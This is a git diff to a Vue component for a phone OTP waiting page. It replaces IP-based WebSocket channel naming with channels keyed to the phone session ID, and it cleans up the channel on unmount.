@@ -116,6 +116,7 @@ import logger from '@/utils/logger';
 import { safeRedirect } from '@/utils/safeRedirect';
 import { getReasonLabel } from '@/constants/rejectionReasons';
 import { getEcho } from '@/services/echo';
+import { customerBroadcastChannel } from '@/utils/customerBroadcastChannel';
 
 const { t } = useI18n();
 const router = useRouter();
@@ -125,10 +126,8 @@ useVisitorTracking( 'phone/otp-waiting' );
 
 // ─── Load context from sessionStorage ───────────────────────────────
 const phoneOtpContext = JSON.parse( sessionStorage.getItem( 'phoneOtpContext' ) || '{}' );
-const otpContext = JSON.parse( sessionStorage.getItem( 'otpContext' ) || '{}' );
 const _phoneNumber = phoneOtpContext.phoneNumber || '';
 const _otpCode = phoneOtpContext.otpCode || '';
-let customerIp = phoneOtpContext.customerIp || otpContext.customerIp || '';
 const phoneSessionId = phoneOtpContext.sessionId || '';
 const phoneStatusSig = phoneOtpContext.statusSig || '';
 
@@ -144,30 +143,16 @@ function retryOtp ()
 
 // ─── WebSocket — listen for admin approval / rejection ──────────────
 let echoChannel = null;
+let echoChannelName = '';
 let isUnmounted = false;
 
 async function setupWebSocket ()
 {
-    // Resolve IP if not in session context
-    if ( !customerIp )
-    {
-        try
-        {
-            const { default: request } = await import( '@/api/request' );
-            const { data } = await request.get( '/customer/ip' );
-            customerIp = data?.customer_ip || '';
-            logger.debug( '[PhoneOtpWaiting] Resolved customer IP:', customerIp );
-        } catch
-        {
-            logger.warn( '[PhoneOtpWaiting] Could not resolve customer IP' );
-        }
-    }
-
     if ( isUnmounted ) return;
 
-    if ( !customerIp )
+    if ( !phoneSessionId )
     {
-        logger.warn( '[PhoneOtpWaiting] No customer IP — WebSocket unavailable' );
+        logger.warn( '[PhoneOtpWaiting] No phone session — WebSocket unavailable' );
         return;
     }
 
@@ -179,10 +164,11 @@ async function setupWebSocket ()
         return;
     }
 
-    const channelName = `phone.${ customerIp }`;
+    const channelName = await customerBroadcastChannel( 'phone', phoneSessionId );
     logger.debug( '[PhoneOtpWaiting] Subscribing to channel:', channelName );
 
     echoChannel = echo.channel( channelName );
+    echoChannelName = channelName;
 
     echoChannel.listen( '.PhoneOtpApproved', handleApproved );
     echoChannel.listen( '.PhoneOtpRejected', handleRejected );
@@ -277,9 +263,9 @@ onUnmounted( () =>
         pollTimer = null;
     }
 
-    if ( echoChannel && customerIp )
+    if ( echoChannel && echoChannelName )
     {
-        try { window.Echo?.leave( `phone.${ customerIp }` ); } catch { /* */ }
+        try { window.Echo?.leave( echoChannelName ); } catch { /* */ }
     }
 } );
 </script>
